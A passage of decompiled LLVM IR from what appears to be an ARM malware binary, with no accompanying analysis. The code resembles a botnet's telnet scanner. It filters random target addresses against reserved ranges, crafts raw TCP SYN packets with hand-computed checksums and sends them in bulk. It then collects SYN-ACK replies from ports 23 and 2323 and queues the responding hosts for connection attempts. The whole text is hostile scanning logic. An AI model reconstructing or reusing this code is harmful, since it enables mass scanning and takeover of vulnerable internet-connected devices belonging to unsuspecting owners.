  store i32 %.464, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ea08 = icmp eq i1 %v7_e9bc, false
  store i1 %v2_ea08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ea08, label %dec_label_pc_ea10, label %dec_label_pc_e8e8

dec_label_pc_ea10:                                ; preds = %.thread33, %.thread32
  %v2_ea10 = icmp ugt i32 %v1_e8ec, 149
  store i1 %v2_ea10, i1* %cpsr_c.global-to-local, align 1
  %v7_ea10 = icmp eq i32 %v1_e8ec, 150
  store i1 %v7_ea10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea10, label %bb390, label %dec_label_pc_ea1c

bb390:                                            ; preds = %dec_label_pc_ea10
  %v3_ea14 = icmp ugt i32 %v1_e900, 30
  store i1 %v3_ea14, i1* %cpsr_c.global-to-local, align 1
  %v8_ea14 = icmp eq i32 %v1_e900, 31
  store i1 %v8_ea14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea14, label %dec_label_pc_e8e8, label %dec_label_pc_ea1c

dec_label_pc_ea1c:                                ; preds = %dec_label_pc_ea10, %bb390
  %v2_ea1c = icmp ugt i32 %v1_e8ec, 48
  store i1 %v2_ea1c, i1* %cpsr_c.global-to-local, align 1
  %v7_ea1c = icmp eq i32 %v1_e8ec, 49
  store i1 %v7_ea1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea1c, label %bb391, label %dec_label_pc_ea28

bb391:                                            ; preds = %dec_label_pc_ea1c
  %v3_ea20 = icmp ugt i32 %v1_e900, 50
  store i1 %v3_ea20, i1* %cpsr_c.global-to-local, align 1
  %v8_ea20 = icmp eq i32 %v1_e900, 51
  store i1 %v8_ea20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea20, label %dec_label_pc_e8e8, label %dec_label_pc_ea28

dec_label_pc_ea28:                                ; preds = %dec_label_pc_ea1c, %bb391
  %v2_ea28 = icmp ugt i32 %v1_e8ec, 177
  store i1 %v2_ea28, i1* %cpsr_c.global-to-local, align 1
  %v7_ea28 = icmp eq i32 %v1_e8ec, 178
  store i1 %v7_ea28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea28, label %bb392, label %dec_label_pc_ea34

bb392:                                            ; preds = %dec_label_pc_ea28
  %v3_ea2c = icmp ugt i32 %v1_e900, 61
  store i1 %v3_ea2c, i1* %cpsr_c.global-to-local, align 1
  %v8_ea2c = icmp eq i32 %v1_e900, 62
  store i1 %v8_ea2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea2c, label %dec_label_pc_e8e8, label %dec_label_pc_ea34

dec_label_pc_ea34:                                ; preds = %dec_label_pc_ea28, %bb392
  %v2_ea34 = icmp ugt i32 %v1_e8ec, 159
  store i1 %v2_ea34, i1* %cpsr_c.global-to-local, align 1
  %v7_ea34 = icmp eq i32 %v1_e8ec, 160
  store i1 %v7_ea34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea34, label %bb393, label %dec_label_pc_ea40

bb393:                                            ; preds = %dec_label_pc_ea34
  %v3_ea38 = icmp ugt i32 %v1_e900, 12
  store i1 %v3_ea38, i1* %cpsr_c.global-to-local, align 1
  %v8_ea38 = icmp eq i32 %v1_e900, 13
  store i1 %v8_ea38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea38, label %dec_label_pc_e8e8, label %dec_label_pc_ea40

dec_label_pc_ea40:                                ; preds = %dec_label_pc_ea34, %bb393
  %v1_ea40 = add nsw i32 %v1_e8ec, -6
  store i32 %v1_ea40, i32* %r3.global-to-local, align 4
  %v2_ea44 = icmp ugt i32 %v1_e8ec, 10
  store i1 %v2_ea44, i1* %cpsr_c.global-to-local, align 1
  %v7_ea44 = icmp eq i32 %v1_e8ec, 11
  store i1 %v7_ea44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea44, label %dec_label_pc_e8e8, label %bb394

bb394:                                            ; preds = %dec_label_pc_ea40
  %v3_ea48 = icmp ne i32 %v1_ea40, 0
  store i1 %v3_ea48, i1* %cpsr_c.global-to-local, align 1
  %v8_ea48 = icmp eq i32 %v1_ea40, 1
  store i1 %v8_ea48, i1* %cpsr_z.global-to-local, align 1
  %v2_ea4c = xor i1 %v3_ea48, true
  %v3_ea4c = or i1 %v8_ea48, %v2_ea4c
  br i1 %v3_ea4c, label %dec_label_pc_e8e8, label %dec_label_pc_ea50

dec_label_pc_ea50:                                ; preds = %bb394
  %v2_ea50 = icmp ugt i32 %v1_e8ec, 21
  store i1 %v2_ea50, i1* %cpsr_c.global-to-local, align 1
  %v7_ea50 = icmp eq i32 %v1_e8ec, 22
  store i1 %v7_ea50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea50, label %dec_label_pc_e8e8, label %bb395

bb395:                                            ; preds = %dec_label_pc_ea50
  %v3_ea54 = icmp ugt i32 %v1_e8ec, 20
  store i1 %v3_ea54, i1* %cpsr_c.global-to-local, align 1
  %v8_ea54 = icmp eq i32 %v1_e8ec, 21
  store i1 %v8_ea54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea54, label %dec_label_pc_e8e8, label %dec_label_pc_ea5c

dec_label_pc_ea5c:                                ; preds = %bb395
  %v2_ea5c = icmp ugt i32 %v1_e8ec, 27
  store i1 %v2_ea5c, i1* %cpsr_c.global-to-local, align 1
  %v7_ea5c = icmp eq i32 %v1_e8ec, 28
  store i1 %v7_ea5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea5c, label %dec_label_pc_e8e8, label %bb396

bb396:                                            ; preds = %dec_label_pc_ea5c
  %v3_ea60 = icmp ugt i32 %v1_e8ec, 25
  store i1 %v3_ea60, i1* %cpsr_c.global-to-local, align 1
  %v8_ea60 = icmp eq i32 %v1_e8ec, 26
  store i1 %v8_ea60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea60, label %dec_label_pc_e8e8, label %dec_label_pc_ea68

dec_label_pc_ea68:                                ; preds = %bb396
  %v2_ea68 = icmp ugt i32 %v1_e8ec, 29
  store i1 %v2_ea68, i1* %cpsr_c.global-to-local, align 1
  %v7_ea68 = icmp eq i32 %v1_e8ec, 30
  store i1 %v7_ea68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea68, label %dec_label_pc_e8e8, label %bb397

bb397:                                            ; preds = %dec_label_pc_ea68
  %v3_ea6c = icmp ugt i32 %v1_e8ec, 28
  store i1 %v3_ea6c, i1* %cpsr_c.global-to-local, align 1
  %v8_ea6c = icmp eq i32 %v1_e8ec, 29
  store i1 %v8_ea6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea6c, label %dec_label_pc_e8e8, label %dec_label_pc_ea74

dec_label_pc_ea74:                                ; preds = %bb397
  %v2_ea74 = icmp ugt i32 %v1_e8ec, 54
  store i1 %v2_ea74, i1* %cpsr_c.global-to-local, align 1
  %v7_ea74 = icmp eq i32 %v1_e8ec, 55
  store i1 %v7_ea74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea74, label %dec_label_pc_e8e8, label %bb398

bb398:                                            ; preds = %dec_label_pc_ea74
  %v3_ea78 = icmp ugt i32 %v1_e8ec, 32
  store i1 %v3_ea78, i1* %cpsr_c.global-to-local, align 1
  %v8_ea78 = icmp eq i32 %v1_e8ec, 33
  store i1 %v8_ea78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea78, label %dec_label_pc_e8e8, label %dec_label_pc_ea80

dec_label_pc_ea80:                                ; preds = %bb398
  %v2_ea80 = icmp ugt i32 %v1_e8ec, 214
  store i1 %v2_ea80, i1* %cpsr_c.global-to-local, align 1
  %v7_ea80 = icmp eq i32 %v1_e8ec, 215
  store i1 %v7_ea80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea80, label %.thread48, label %bb399

bb399:                                            ; preds = %dec_label_pc_ea80
  %v3_ea84 = icmp ugt i32 %v1_e8ec, 213
  store i1 %v3_ea84, i1* %cpsr_c.global-to-local, align 1
  %v8_ea84 = icmp eq i32 %v1_e8ec, 214
  store i1 %v8_ea84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea84, label %bb400, label %dec_label_pc_ea94

.thread48:                                        ; preds = %dec_label_pc_ea80
  br label %dec_label_pc_e8e8

bb400:                                            ; preds = %bb399
  br label %dec_label_pc_e8e8

dec_label_pc_ea94:                                ; preds = %bb399
  %v5_eaa0 = call i32 @llvm.bswap.i32(i32 %v0_e8e8)
  store i32 %v5_eaa0, i32* %r3.global-to-local, align 4
  %tmp401 = and i32 %v0_e8e8, 65280
  %tmp402 = call i32 @llvm.bswap.i32(i32 %tmp401)
  %v3_eaa8 = udiv i32 %v5_eaa0, 16777216
  %tmp403 = and i32 %v0_e8e8, 16711680
  %tmp404 = call i32 @llvm.bswap.i32(i32 %tmp403)
  %v4_eab0 = udiv i32 %tmp402, 256
  %v4_eab4 = mul nuw nsw i32 %tmp404, 256
  store i32 ptrtoint (i8** @global_var_21c34.155 to i32), i32* @r0, align 4
  %tmp405 = and i32 %v0_e8e8, 65536
  %v3_eabc = icmp ne i32 %tmp405, 0
  store i1 %v3_eabc, i1* %cpsr_c.global-to-local, align 1
  %v4_eabc = mul i32 %v5_eaa0, 16777216
  %v5_eab0 = or i32 %v4_eabc, %v3_eaa8
  %v5_eab4 = or i32 %v5_eab0, %v4_eab0
  %v5_eabc = or i32 %v5_eab4, %v4_eab4
  store i32 %v5_eabc, i32* %r2.global-to-local, align 4
  store i16 0, i16* bitcast (i32* @global_var_21c3e.197 to i16*), align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i32 %v5_eabc, i32* @global_var_21c44.198, align 4
  %v3_eacc = call i32 @checksum_generic(i32 ptrtoint (i8** @global_var_21c34.155 to i32), i32 20)
  %v4_eacc = trunc i32 %v3_eacc to i16
  store i32 %v3_eacc, i32* %r0.global-to-local, align 4
  %v3_ead0 = load i32, i32* %stack_var_-52, align 4
  %v5_eae0 = sdiv i32 %v3_ead0, 10
  %v3_eae4 = mul i32 %v5_eae0, 8
  store i32 %v3_eae4, i32* %r2.global-to-local, align 4
  %v2_eaec = mul i32 %v5_eae0, 10
  store i32 %v2_eaec, i32* %r3.global-to-local, align 4
  %v3_eaf0 = icmp uge i32 %v3_ead0, %v2_eaec
  store i1 %v3_eaf0, i1* %cpsr_c.global-to-local, align 1
  %v9_eaf0 = icmp eq i32 %v3_ead0, %v2_eaec
  store i1 %v9_eaf0, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i8** @global_var_21c34.155 to i32), i32* %r1.global-to-local, align 4
  br i1 %v9_eaf0, label %bb406, label %.thread60

.thread60:                                        ; preds = %dec_label_pc_ea94
  store i32 ptrtoint (i16* @global_var_21c48.158 to i32), i32* %r3.global-to-local, align 4
  store i16 %v4_eacc, i16* bitcast (i32* @global_var_21c3e.197 to i16*), align 4
  store i32 ptrtoint (i8** @global_var_21c34.155 to i32), i32* %r0.global-to-local, align 4
  store i16 5888, i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_21c48.158 to i32), i32 2) to i16*), align 2
  %v4_eb10 = load i32, i32* @global_var_21c44.198, align 4
  store i32 %v4_eb10, i32* @global_var_21c4c.200, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %bb407

bb406:                                            ; preds = %dec_label_pc_ea94
  store i16 %v4_eacc, i16* bitcast (i32* @global_var_21c3e.197 to i16*), align 4
  store i32 ptrtoint (i8** @global_var_21c34.155 to i32), i32* %r0.global-to-local, align 4
  %v4_eb1054 = load i32, i32* @global_var_21c44.198, align 4
  store i32 ptrtoint (i16* @global_var_21c48.158 to i32), i32* %r2.global-to-local, align 4
  store i32 4873, i32* %r3.global-to-local, align 4
  store i32 %v4_eb1054, i32* @global_var_21c4c.200, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i16 4873, i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_21c48.158 to i32), i32 2) to i16*), align 2
  br label %bb407

bb407:                                            ; preds = %.thread60, %bb406
  store i16 0, i16* bitcast (i32* @global_var_21c58.201 to i16*), align 4
  store i32 ptrtoint (i16* @global_var_21c48.158 to i32), i32* @r1, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v6_eb3c = call i32 @checksum_tcpudp(i32 ptrtoint (i8** @global_var_21c34.155 to i32), i32 sext (i16 ptrtoint (i16* @global_var_21c48.158 to i16) to i32), i32 5120, i32 20)
  %v7_eb3c = trunc i32 %v6_eb3c to i16
  store i32 ptrtoint (i8** @global_var_21c34.155 to i32), i32* %r1.global-to-local, align 4
  %v2_eb48 = load i32, i32* @global_var_2474c.153, align 4
  store i16 %v7_eb3c, i16* bitcast (i32* @global_var_21c58.201 to i16*), align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v3_eb74 = load i16, i16* @global_var_21c4a.163, align 2
  %v4_eb74 = zext i16 %v3_eb74 to i32
  store i32 %v4_eb74, i32* @lr, align 4
  store i32 %v2_f9e8, i32* %ip.global-to-local, align 4
  store i32 %v2_eb48, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v7_eb90 = call i32 @__libc_sendto(i32 %v2_eb48, i32 ptrtoint (i8** @global_var_21c34.155 to i32), i32 40, i32 16384, i32 %v2_e8b8, i32 16)
  store i32 %v7_eb90, i32* %r0.global-to-local, align 4
  %v3_eb94 = load i32, i32* %stack_var_-52, align 4
  %v1_eb98 = add i32 %v3_eb94, 1
  store i32 %v1_eb98, i32* %r3.global-to-local, align 4
  %v3_eb9c = icmp ugt i32 %v1_eb98, 383
  store i1 %v3_eb9c, i1* %cpsr_c.global-to-local, align 1
  %v8_eb9c = icmp eq i32 %v1_eb98, 384
  store i1 %v8_eb9c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_eb98, i32* %stack_var_-52, align 4
  %v5_eba4 = icmp slt i32 %v1_eb98, 384
  br i1 %v5_eba4, label %dec_label_pc_e8bc, label %dec_label_pc_eba8

dec_label_pc_eba8:                                ; preds = %bb407
  %v0_eba8 = load i32, i32* @r4, align 4
  br label %dec_label_pc_ebac

dec_label_pc_ebac:                                ; preds = %dec_label_pc_e898, %dec_label_pc_eba8
  %stack_var_-1876.1 = phi i32 [ %stack_var_-1876.0, %dec_label_pc_e898 ], [ %v0_eba8, %dec_label_pc_eba8 ]
  %v0_ebac = call i32 @__GI___errno_location()
  store i32 %v0_ebac, i32* @fp, align 4
  store i32 %v2_e890, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_ebbc, i32* @r4, align 4
  br label %dec_label_pc_ebc0

dec_label_pc_ebc0:                                ; preds = %dec_label_pc_ec80, %dec_label_pc_ec78, %dec_label_pc_ec70, %dec_label_pc_ec4c, %dec_label_pc_ec3c, %dec_label_pc_ec20, %dec_label_pc_ec08, %dec_label_pc_ec68, %dec_label_pc_ec5c, %dec_label_pc_ec00, %dec_label_pc_ed38, %dec_label_pc_ebac
  %v1_ebc4 = phi i32 [ %v0_ebac, %dec_label_pc_ebac ], [ %v1_ebc4.pre.pre, %dec_label_pc_ed38 ], [ %v0_ebf4, %dec_label_pc_ec00 ], [ %v0_ebf4, %dec_label_pc_ec5c ], [ %v0_ebf4, %dec_label_pc_ec68 ], [ %v0_ebf4, %dec_label_pc_ec08 ], [ %v0_ebf4, %dec_label_pc_ec20 ], [ %v0_ebf4, %dec_label_pc_ec3c ], [ %v0_ebf4, %dec_label_pc_ec4c ], [ %v0_ebf4, %dec_label_pc_ec70 ], [ %v0_ebf4, %dec_label_pc_ec78 ], [ %v0_ebf4, %dec_label_pc_ec80 ]
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_ebc4 = inttoptr i32 %v1_ebc4 to i32*
  store i32 0, i32* %v2_ebc4, align 4
  %v2_ebd0 = load i32, i32* @global_var_2474c.153, align 4
  store i32 %v2_ebd0, i32* %r0.global-to-local, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %v2_e890, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ebe0 = load i32, i32* %ip.global-to-local, align 4
  %v6_ebe8 = call i32 @__libc_recvfrom(i32 %v2_ebd0, i32 %v2_e890, i32 1514, i32 16384, i32 %v0_ebe0, i32 %v0_ebe0)
  store i32 %v6_ebe8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ebec = icmp eq i32 %v6_ebe8, 0
  store i1 %v2_ebec, i1* %cpsr_z.global-to-local, align 1
  %tmp408 = icmp slt i32 %v6_ebe8, 1
  br i1 %tmp408, label %dec_label_pc_ed48, label %dec_label_pc_ebf4

dec_label_pc_ebf4:                                ; preds = %dec_label_pc_ebc0
  %v0_ebf4 = load i32, i32* @fp, align 4
  %v1_ebf4 = inttoptr i32 %v0_ebf4 to i32*
  %v2_ebf4 = load i32, i32* %v1_ebf4, align 4
  store i32 %v2_ebf4, i32* %r3.global-to-local, align 4
  %v2_ebf8 = icmp ugt i32 %v2_ebf4, 10
  store i1 %v2_ebf8, i1* %cpsr_c.global-to-local, align 1
  %v7_ebf8 = icmp eq i32 %v2_ebf4, 11
  store i1 %v7_ebf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ebf8, label %dec_label_pc_ed48, label %dec_label_pc_ec00

dec_label_pc_ec00:                                ; preds = %dec_label_pc_ebf4
  %v2_ec00 = icmp ugt i32 %v6_ebe8, 38
  store i1 %v2_ec00, i1* %cpsr_c.global-to-local, align 1
  %v7_ec00 = icmp eq i32 %v6_ebe8, 39
  store i1 %v7_ec00, i1* %cpsr_z.global-to-local, align 1
  %v2_ec04 = xor i1 %v2_ec00, true
  %v3_ec04 = or i1 %v7_ec00, %v2_ec04
  br i1 %v3_ec04, label %dec_label_pc_ebc0, label %dec_label_pc_ec08

dec_label_pc_ec08:                                ; preds = %dec_label_pc_ec00
  store i32 %v2_e890, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2472c.58 to i32), i32* %ip.global-to-local, align 4
  %v3_ec10 = load i32, i32* %v2_ec10, align 4
  store i32 %v3_ec10, i32* %r2.global-to-local, align 4
  %v2_ec14 = load i32, i32* @global_var_2472c.58, align 4
  store i32 %v2_ec14, i32* %r3.global-to-local, align 4
  %v3_ec18 = icmp uge i32 %v3_ec10, %v2_ec14
  store i1 %v3_ec18, i1* %cpsr_c.global-to-local, align 1
  %v9_ec18 = icmp eq i32 %v3_ec10, %v2_ec14
  store i1 %v9_ec18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ec18, label %dec_label_pc_ec20, label %dec_label_pc_ebc0

dec_label_pc_ec20:                                ; preds = %dec_label_pc_ec08
  store i32 %v2_e890, i32* @lr, align 4
  %v3_ec24 = load i8, i8* %v2_ec24, align 1
  %v4_ec24 = zext i8 %v3_ec24 to i32
  store i32 %v4_ec24, i32* %r3.global-to-local, align 4
  %v2_ec28 = icmp ugt i8 %v3_ec24, 5
  store i1 %v2_ec28, i1* %cpsr_c.global-to-local, align 1
  %v7_ec28 = icmp eq i8 %v3_ec24, 6
  store i1 %v7_ec28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec28, label %dec_label_pc_ec30, label %dec_label_pc_ebc0

dec_label_pc_ec30:                                ; preds = %dec_label_pc_ec20
  %v0_ec30 = load i32, i32* @r4, align 4
  %v1_ec30 = inttoptr i32 %v0_ec30 to i16*
  %v2_ec30 = load i16, i16* %v1_ec30, align 2
  %v3_ec30 = zext i16 %v2_ec30 to i32
  store i32 %v3_ec30, i32* %ip.global-to-local, align 4
  %v2_ec34 = icmp ugt i16 %v2_ec30, 5887
  store i1 %v2_ec34, i1* %cpsr_c.global-to-local, align 1
  %v7_ec34 = icmp eq i16 %v2_ec30, 5888
  store i1 %v7_ec34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec34, label %dec_label_pc_ec4c, label %dec_label_pc_ec3c

dec_label_pc_ec3c:                                ; preds = %dec_label_pc_ec30
  store i32 4873, i32* %r3.global-to-local, align 4
  %v3_ec44 = icmp ugt i16 %v2_ec30, 4872
  store i1 %v3_ec44, i1* %cpsr_c.global-to-local, align 1
  %v9_ec44 = icmp eq i16 %v2_ec30, 4873
  store i1 %v9_ec44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ec44, label %dec_label_pc_ec4c, label %dec_label_pc_ebc0

dec_label_pc_ec4c:                                ; preds = %dec_label_pc_ec3c, %dec_label_pc_ec30
  %v1_ec4c = add i32 %v0_ec30, 2
  %v2_ec4c = inttoptr i32 %v1_ec4c to i16*
  %v3_ec4c = load i16, i16* %v2_ec4c, align 2
  %v4_ec4c = zext i16 %v3_ec4c to i32
  store i32 %v4_ec4c, i32* %r3.global-to-local, align 4
  store i32 %v4_e760, i32* %r0.global-to-local, align 4
  %v3_ec54 = icmp uge i32 %v4_ec4c, %v4_e760
  store i1 %v3_ec54, i1* %cpsr_c.global-to-local, align 1
  %v9_ec54 = icmp eq i32 %v4_ec4c, %v4_e760
  store i1 %v9_ec54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ec54, label %dec_label_pc_ec5c, label %dec_label_pc_ebc0

dec_label_pc_ec5c:                                ; preds = %dec_label_pc_ec4c
  %v1_ec5c = add i32 %v0_ec30, 13
  %v2_ec5c = inttoptr i32 %v1_ec5c to i8*
  %v3_ec5c = load i8, i8* %v2_ec5c, align 1
  %v4_ec5c = zext i8 %v3_ec5c to i32
  store i32 %v4_ec5c, i32* %r3.global-to-local, align 4
  %v1_ec60 = and i32 %v4_ec5c, 2
  %v2_ec60 = icmp eq i32 %v1_ec60, 0
  store i1 %v2_ec60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec60, label %dec_label_pc_ebc0, label %dec_label_pc_ec68

dec_label_pc_ec68:                                ; preds = %dec_label_pc_ec5c
  %v1_ec68 = and i32 %v4_ec5c, 16
  %v2_ec68 = icmp eq i32 %v1_ec68, 0
  store i1 %v2_ec68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec68, label %dec_label_pc_ebc0, label %dec_label_pc_ec70

dec_label_pc_ec70:                                ; preds = %dec_label_pc_ec68
  %v1_ec70 = and i32 %v4_ec5c, 4
  %v2_ec70 = icmp eq i32 %v1_ec70, 0
  store i1 %v2_ec70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec70, label %dec_label_pc_ec78, label %dec_label_pc_ebc0

dec_label_pc_ec78:                                ; preds = %dec_label_pc_ec70
  %tmp = urem i8 %v3_ec5c, 2
  %v2_ec78 = icmp eq i8 %tmp, 0
  store i1 %v2_ec78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec78, label %dec_label_pc_ec80, label %dec_label_pc_ebc0

dec_label_pc_ec80:                                ; preds = %dec_label_pc_ec78
  %v1_ec80 = add i32 %v0_ec30, 8
  %v2_ec80 = inttoptr i32 %v1_ec80 to i32*
  %v3_ec80 = load i32, i32* %v2_ec80, align 4
  %v5_ec98 = call i32 @llvm.bswap.i32(i32 %v3_ec80)
  %v1_ec9c = add i32 %v5_ec98, -1
  store i32 %v1_ec9c, i32* %r2.global-to-local, align 4
  %v1_eca0 = and i32 %v1_ec9c, 16711680
  store i32 %v1_eca0, i32* %r0.global-to-local, align 4
  %v3_eca4 = udiv i32 %v1_ec9c, 16777216
  %v4_ecac = udiv i32 %v1_eca0, 256
  %v5_ecac = or i32 %v4_ecac, %v3_eca4
  %v1_eca8 = mul i32 %v1_ec9c, 256
  %v4_ecb0 = and i32 %v1_eca8, 16711680
  %v5_ecb0 = or i32 %v5_ecac, %v4_ecb0
  store i32 %v5_ecb0, i32* %r3.global-to-local, align 4
  store i32 %v2_e890, i32* %r1.global-to-local, align 4
  %v3_ecb8 = load i32, i32* %v2_ecb8, align 4
  store i32 %v3_ecb8, i32* @lr, align 4
  %v5_ecbc = call i32 @llvm.bswap.i32(i32 %v1_ec9c)
  store i32 %v5_ecbc, i32* %r3.global-to-local, align 4
  %v3_ecc0 = icmp uge i32 %v5_ecbc, %v3_ecb8
  store i1 %v3_ecc0, i1* %cpsr_c.global-to-local, align 1
  %v9_ecc0 = icmp eq i32 %v5_ecbc, %v3_ecb8
  store i1 %v9_ecc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ecc0, label %dec_label_pc_ecc8, label %dec_label_pc_ebc0

dec_label_pc_ecc8:                                ; preds = %dec_label_pc_ec80
  %v0_ecc8 = load i32, i32* @r5, align 4
  %v2_ecc8 = icmp ugt i32 %v0_ecc8, 254
  store i1 %v2_ecc8, i1* %cpsr_c.global-to-local, align 1
  %v7_ecc8 = icmp eq i32 %v0_ecc8, 255
  store i1 %v7_ecc8, i1* %cpsr_z.global-to-local, align 1
  %v8_eccc = icmp sgt i32 %v0_ecc8, 255
  br i1 %v8_eccc, label %dec_label_pc_ed48, label %dec_label_pc_ecd0

dec_label_pc_ecd0:                                ; preds = %dec_label_pc_ecc8
  %v2_ecd8 = load i32, i32* @global_var_24748.151, align 4
  store i32 %v2_ecd8, i32* %r1.global-to-local, align 4
  %v3_ecdc = mul i32 %v0_ecc8, 256
  store i32 %v3_ecdc, i32* %r2.global-to-local, align 4
  %v2_ece0 = mul i32 %v0_ecc8, 288
  store i32 %v2_ece0, i32* %r3.global-to-local, align 4
  %v2_ece4 = add i32 %v2_ecd8, %v2_ece0
  store i32 %v2_ece4, i32* @r0, align 4
  %v1_ece8 = add i32 %v2_ece4, 12
  %v2_ece8 = inttoptr i32 %v1_ece8 to i32*
  %v3_ece8 = load i32, i32* %v2_ece8, align 4
  store i32 %v3_ece8, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ecec = icmp eq i32 %v3_ece8, 0
  store i1 %v2_ecec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ecec, label %dec_label_pc_ed30, label %dec_label_pc_ed0c.preheader

dec_label_pc_ed0c.preheader:                      ; preds = %dec_label_pc_ecd0
  %v2_ecf0 = add i32 %v0_ecc8, 1
  %v2_ecf8 = and i32 %v2_ecf0, 134217728
  %v3_ecf8 = icmp ne i32 %v2_ecf8, 0
  store i1 %v3_ecf8, i1* %cpsr_c.global-to-local, align 1
  %v3_ecfc = mul i32 %v2_ecf0, 288
  %v3_ed00 = add i32 %v2_ecd8, %v3_ecfc
  store i32 %v3_ed00, i32* %r3.global-to-local, align 4
  store i32 %v0_ecc8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ed0c

dec_label_pc_ed0c:                                ; preds = %dec_label_pc_ed0c.preheader, %dec_label_pc_ed18
  %v0_ed18 = phi i32 [ %v3_ed00, %dec_label_pc_ed0c.preheader ], [ %v1_ed24, %dec_label_pc_ed18 ]
  %v0_ed0c = phi i32 [ %v0_ecc8, %dec_label_pc_ed0c.preheader ], [ %v1_ed0c, %dec_label_pc_ed18 ]
  %v1_ed0c = add i32 %v0_ed0c, 1
  store i32 %v1_ed0c, i32* %r2.global-to-local, align 4
  %v7_ed10 = icmp eq i32 %v1_ed0c, 256
  br i1 %v7_ed10, label %dec_label_pc_ed48.loopexit, label %dec_label_pc_ed18

dec_label_pc_ed18:                                ; preds = %dec_label_pc_ed0c
  store i32 %v0_ed18, i32* @r0, align 4
  %v1_ed1c = add i32 %v0_ed18, 12
  %v2_ed1c = inttoptr i32 %v1_ed1c to i32*
  %v3_ed1c = load i32, i32* %v2_ed1c, align 4
  %v2_ed20 = icmp eq i32 %v3_ed1c, 0
  %v1_ed24 = add i32 %v0_ed18, 288
  store i32 %v1_ed24, i32* %r3.global-to-local, align 4
  br i1 %v2_ed20, label %dec_label_pc_ed2c, label %dec_label_pc_ed0c

dec_label_pc_ed2c:                                ; preds = %dec_label_pc_ed18
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ed0c, i32* @r5, align 4
  br label %dec_label_pc_ed30

dec_label_pc_ed30:                                ; preds = %dec_label_pc_ecd0, %dec_label_pc_ed2c
  %v1_ed38 = phi i32 [ %v2_ece4, %dec_label_pc_ecd0 ], [ %v0_ed18, %dec_label_pc_ed2c ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ed30 = icmp eq i32 %v1_ed38, 0
  store i1 %v2_ed30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ed30, label %dec_label_pc_ed48, label %dec_label_pc_ed38

dec_label_pc_ed38:                                ; preds = %dec_label_pc_ed30
  %v2_ed38 = add i32 %v1_ed38, 16
  %v3_ed38 = inttoptr i32 %v2_ed38 to i32*
  store i32 %v3_ecb8, i32* %v3_ed38, align 4
  %v0_ed3c = load i32, i32* %ip.global-to-local, align 4
  %v1_ed3c = trunc i32 %v0_ed3c to i16
  %v2_ed3c = load i32, i32* @r0, align 4
  %v3_ed3c = add i32 %v2_ed3c, 20
  %v4_ed3c = inttoptr i32 %v3_ed3c to i16*
  store i16 %v1_ed3c, i16* %v4_ed3c, align 2
  %v0_ed40 = call i32 @setup_connection()
  store i32 %v0_ed40, i32* %r0.global-to-local, align 4
  %v1_ebc4.pre.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_ebc0

dec_label_pc_ed48.loopexit:                       ; preds = %dec_label_pc_ed0c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ed48

